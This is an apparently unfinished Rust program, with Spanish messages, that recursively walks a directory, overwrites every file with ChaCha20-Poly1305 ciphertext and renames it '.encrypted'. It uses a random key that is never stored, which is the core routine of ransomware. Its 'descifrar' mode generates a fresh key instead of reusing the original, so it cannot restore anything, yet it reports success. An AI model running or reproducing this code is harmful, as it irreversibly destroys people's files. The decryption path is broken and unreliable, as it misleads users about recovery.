use std::fs;
use std::env;
use std::path::{Path, PathBuf};
use colored::*;
use encrypt_rust::encryption::encrypt_chacha;
use encrypt_rust::encryption::decrypt_chacha;
use chacha20poly1305::{
    aead::{AeadCore, KeyInit, OsRng},
    ChaCha20Poly1305,
};

pub struct DirInfo { 
    pub files: Vec<PathBuf>,
    pub dirs: Vec<PathBuf>,
}

impl DirInfo { 
    pub fn new() -> Self { 
        DirInfo { 
            files: Vec::new(), 
            dirs: Vec::new(), 
        }
    }

    pub fn explore(&mut self, path: &Path) {
        if !path.is_dir() { 
            eprintln!("{:?} no es un directorio válido", path);
            return;
        }

        self.dirs.push(path.to_path_buf()); 

        let entries = match fs::read_dir(path) { 
            Ok(entries) => entries,
            Err(e) => {
                eprintln!("Error leyendo {:?}: {}", path, e);
                return;
            }       
        };

        for entry in entries {
            match entry {
                Ok(entry) => {
                    let entry_path = entry.path();

                    if entry_path.is_file() {
                        self.files.push(entry_path);
                    } else if entry_path.is_dir() {
                        self.explore(&entry_path); 
                    }         
                }
                Err(e) => eprintln!("Error leyendo entrada en {:?}: {}", path, e),
            }
        }
    }
}

pub fn encrypt_files(dir_info: &DirInfo, key: &[u8; 32], nonce: &[u8; 12]) {
    for file in &dir_info.files {
        let file_data = fs::read(file).expect("Failed to read file");
        let encrypted_data = encrypt_chacha(&file_data, key, nonce);

        fs::write(file, &encrypted_data).expect("Failed to write encrypted file");
        
        let new_name = file.with_extension("encrypted");
        fs::rename(file, &new_name).expect("Failed to add the extension");
    }
}

pub fn decrypt_files(dir_info: &DirInfo, key: &[u8; 32], nonce: &[u8; 12]) {
    for file in &dir_info.files {
        let file_data = fs::read(file).expect("Failed to read file");
        let decrypted_data = decrypt_chacha(&file_data, key, nonce);

        fs::write(file, &decrypted_data).expect("Failed to write decrypted file");
        
        let new_name = file.with_extension("");
        fs::rename(file, &new_name).expect("Failed to delete extension");
    }
}

fn main() {
    let args: Vec<String> = env::args().collect();

    if args.len() < 3 {
        eprintln!("❌ Uso correcto: cargo run -- <operacion> <ruta>");
        eprintln!("   Operaciones disponibles: listar, cifrar, descifrar");
        return;
    }

    let operation = &args[1];
    let path_request = &args[2];
    let target_path = Path::new(path_request);

    match operation.as_str() {
        "listar" => {
            println!("📂 Listando ficheros en {path_request}...\n");
            
            let mut info = DirInfo::new();
            info.explore(target_path);

            println!("Directorios encontrados: ");
            for d in &info.dirs {
                println!("{}/", format!("{}", d.display()).blue());
            }
            
            println!("Ficheros encontrados: ");
            for f in &info.files {
                println!("{}/", format!("{}", f.display()).yellow());
            }
        }
        "cifrar" => {
            println!("🚩 Encriptando datos desde {path_request} 🚩\n");
            
            let key = ChaCha20Poly1305::generate_key(&mut OsRng);
            let nonce = ChaCha20Poly1305::generate_nonce(&mut OsRng);
            
            // Convertimos los GenericArray a slices de tamaño fijo [u8; 32] y [u8; 12]
            let key_bytes: &[u8; 32] = key.as_slice().try_into().expect("Invalid key length");
            let nonce_bytes: &[u8; 12] = nonce.as_slice().try_into().expect("Invalid nonce length");

            let mut info = DirInfo::new();
            info.explore(target_path);

            encrypt_files(&info, key_bytes, nonce_bytes);
            
            println!("✅ Cifrado completado.");
            // imprimir key y nonce hasta saber que hacer con ello
            // limpar código antes de seguir y ponerlo en ingles
            // prueba de cambio en git
        }
        "descifrar" => {
            println!("🔓 Desencriptando datos desde {path_request} 🔓\n");
            
            let key = ChaCha20Poly1305::generate_key(&mut OsRng); 
            let nonce = ChaCha20Poly1305::generate_nonce(&mut OsRng);

            let key_bytes: &[u8; 32] = key.as_slice().try_into().expect("Invalid key length");
            let nonce_bytes: &[u8; 12] = nonce.as_slice().try_into().expect("Invalid nonce length");

            let mut info = DirInfo::new();
            info.explore(target_path);

            decrypt_files(&info, key_bytes, nonce_bytes);

            println!("✅ Descifrado completado.");
        }
        unknown => {
            eprintln!("❌ Operación desconocida: '{}'. Usa: listar, cifrar o descifrar.", unknown);
        }
    }
}